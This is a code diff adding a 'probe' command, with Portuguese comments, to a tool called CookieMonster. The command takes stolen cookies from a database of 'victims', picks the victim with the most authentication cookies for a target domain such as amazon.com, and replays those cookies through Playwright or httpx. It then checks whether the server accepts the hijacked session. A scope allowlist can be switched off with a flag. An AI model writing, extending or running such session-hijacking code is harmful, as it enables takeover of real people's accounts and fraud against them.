@@ -171,6 +171,161 @@ def cookies(db_path: Path, victim: int, domain: str, scheme: str, req_path: str,
     console.print(f"[dim]Total: {len(matched)} cookies aplicáveis[/]")
 
 
+# ---- Fase A: probe — pipeline unificado (best + cookies + inject + check) ----
+
+@cli.command()
+@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
+              show_default=True)
+@click.option("--domain", required=True, help="Domínio alvo (ex.: amazon.com)")
+@click.option("--scheme", type=click.Choice(["https", "http"]), default="https",
+              show_default=True)
+@click.option("--path", "req_path", default="/", show_default=True)
+@click.option("--url", default=None,
+              help="URL alvo (padrão: scheme://host/req_path)")
+@click.option("--channel", type=click.Choice(["playwright", "httpx"]),
+              default="playwright", show_default=True)
+@click.option("--max-wait-ms", type=int, default=8000, show_default=True)
+@click.option("--replay-mode", type=click.Choice(["strict", "browser_default", "randomized"]),
+              default="strict", show_default=True)
+@click.option("--allow-unsafe-scope", is_flag=True,
+              help="Desativa o guardrail de escopo.")
+def probe(db_path: Path, domain: str, scheme: str, req_path: str, url,
+          channel: str, max_wait_ms: int, replay_mode: str, allow_unsafe_scope: bool):
+    """Pipeline unificado: best + cookies + inject + check para um alvo.
+
+    Saida amigavel mostrando a vitima escolhida, artefatos de autenticacao
+    detectados, replay no navegador e estado final (CONFIRMED/LIKELY/ANONYMOUS/UNKNOWN).
+    """
+    from .domain.matcher import applicable_cookies
+    from .validate.auth_state import (detect_baseline_vs_injected as detect_diff,
+                                    CONFIRMED, LIKELY, ANONYMOUS, UNKNOWN)
+    from .validate.scoring import score_artifacts
+    from .inject import httpx_client, playwright_client
+    from .inject.capture import sent_cookie_names
+    from .util import scope as scope_util
+
+    store = _load_store(str(db_path))
+    host = domain.split("://")[-1].strip("/")
+
+    if not scope_util.allowed(host, unsafe=allow_unsafe_scope):
+        console.print("[red]Recusado: alvo fora da allowlist (scope.txt). Use "
+                      "--allow-unsafe-scope para desabilitar (NAO recomendado).[/]")
+        return
+
+    target_url = url or f"{scheme}://{host}{req_path}"
+
+    # 1) Melhor vitima
+    best = store.best_victims_for_domain(domain, limit=1)
+    if not best:
+        console.print(f"[red]Nenhuma vitima com cookies para {domain}[/]")
+        return
+    victim = best[0]
+    console.print(f"[bold bright_white]=== CookieMonster: probe {domain} ===[/]")
+    console.print(f"\n[1] [cyan]VITIMA SUGERIDA[/]")
+    console.print(f"    vid=[yellow]{victim['victim_id']}[/yellow]  "
+                  f"auth={victim['auth']}  total={victim['total']}")
+    console.print(f"    arquivo={victim['dir_name'][:64]}")
+
+    # 2) Cookies aplicaveis + artefatos auth
+    raw = store.list_cookies(victim_id=victim["victim_id"], domain=domain, limit=100000)
+    matched = applicable_cookies([dict(r) for r in raw], scheme, host, req_path)
+    auth_arts = [c for c in matched if classify(c["name"]) == "auth"]
+    console.print(f"\n[2] [cyan]ARTEFATOS DE AUTENTICACAO[/]")
+    if auth_arts:
+        for c in auth_arts[:10]:
+            console.print(f"    [green]>[/green] {c['name']:30}  auth  score=10+")
+        if len(auth_arts) > 10:
+            console.print(f"    [dim]...+ {len(auth_arts) - 10} mais[/dim]")
+    else:
+        console.print(f"    [yellow]Nenhum artefato auth classificado por nome[/yellow]")
+    console.print(f"    [dim]{len(matched)} cookies aplicaveis no total[/dim]")
+
+    # 3) Replay (baseline sem cookies + injetado com cookies)
+    console.print(f"\n[3] [cyan]REPLAY ({channel})[/]")
+    def replay(cookies_):
+        if channel == "httpx":
+            r = httpx_client.get(target_url, cookies_)
+            r.setdefault("sent_cookies", [])
+            r["sent_cookies"] = [{"headers": {"cookie": httpx_client.cookies_to_header(cookies_)}}]
+            return r
+        return playwright_client.replay(
+            target_url, cookies_, mode=replay_mode, max_wait_ms=max_wait_ms,
+        )
+
+    baseline = replay([])
+    injected = replay(matched)
+
+    if injected.get("error"):
+        console.print(f"    [red]erro: {injected['error'][:120]}[/red]")
+        baseline = {"status_code": None, "final_url": "", "text": "",
+                    "evidence": {}, "sent_cookies": []}
+        injected = {"status_code": None, "final_url": "", "text": "",
+                    "evidence": {}, "sent_cookies": [], "cookie_jar": []}
+    else:
+        console.print(f"    URL final: [cyan]{injected.get('final_url', '?')[:100]}[/cyan]")
+        if channel == "playwright":
+            sent_names = set(injected.get("cookie_jar") or [])
+            console.print(f"    Cookies enviados ao alvo: [green]{len(sent_names)}[/green]")
+
+    # 4) Validacao
+    console.print(f"\n[4] [cyan]VALIDACAO[/]")
+    if baseline.get("evidence") and injected.get("evidence"):
+        result = detect_diff(baseline["evidence"], injected["evidence"], domain=host)
+    else:
+        from .validate.auth_state import detect_from_summary
+        result = detect_from_summary(baseline, injected, host)
+
+    state = result["state"]
+    conf = result.get("confidence", 0)
+    color = {"CONFIRMED": "green", "LIKELY": "cyan", "ANONYMOUS": "red",
+             "UNKNOWN": "yellow"}.get(state, "yellow")
+    state_pt = {
+        "CONFIRMED": "ACESSO CONFIRMADO",
+        "LIKELY": "ACESSO PROVAVEL",
+        "ANONYMOUS": "ACESSO REJEITADO",
+        "UNKNOWN": "INDETERMINADO",
+    }
+    console.print(f"    >>> ESTADO: [bold {color}]{state}[/] ([bold]{state_pt.get(state, state)}[/])")
+    console.print(f"    >>> Confianca: [bold]{conf:.2f}[/]")
+    if state == ANONYMOUS:
+        console.print(f"    [red]>>> O servidor RECUSOU os cookies.[/red]")
+    elif state == CONFIRMED:
+        console.print(f"    [green]>>> Identidade diferencial detectada. Acesso provavel.[/green]")
+    elif state == LIKELY:
+        console.print(f"    [cyan]>>> UI autenticada diferencial, sem identidade explicita.[/cyan]")
+    else:
+        console.print(f"    [yellow]>>> Evidencia insuficiente. Investigue manualmente.[/yellow]")
+
+    # Sinais diferenciais (resumo)
+    diff = result.get("differential") or {}
+    if diff:
+        bits = []
+        for k, v in diff.items():
+            if isinstance(v, dict):
+                bits.append(f"{k}: base={v.get('baseline')} inj={v.get('injected')}")
+            else:
+                bits.append(f"{k}={v}")
+        console.print(f"    [dim]diferencial: {' | '.join(bits[:5])}")
+
+    # Persistir run
+    from .report import json_out
+    evidence_blob = json_out.dumps({
+        "state": state, "confidence": conf,
+        "differential": result.get("differential", {}),
+        "baseline_evidence": result.get("baseline", {}),
+        "injected_evidence": result.get("injected", {}),
+    })
+    run_id = store.record_run(victim["victim_id"], target_url, host, channel,
+                              state=state, confidence=conf, evidence_json=evidence_blob)
+    console.print(f"\n[dim]run_id={run_id} salvo em runs[/dim]")
+
+
+def classify(name: str) -> str:
+    """Classifica nome de cookie em 'auth'/'anon'/'other' (heuristica)."""
+    from .domain.selection import classify_name
+    return classify_name(name)
+
+
 # ---- Fase M2 (injeção & edição) ----
 
 @cli.command()
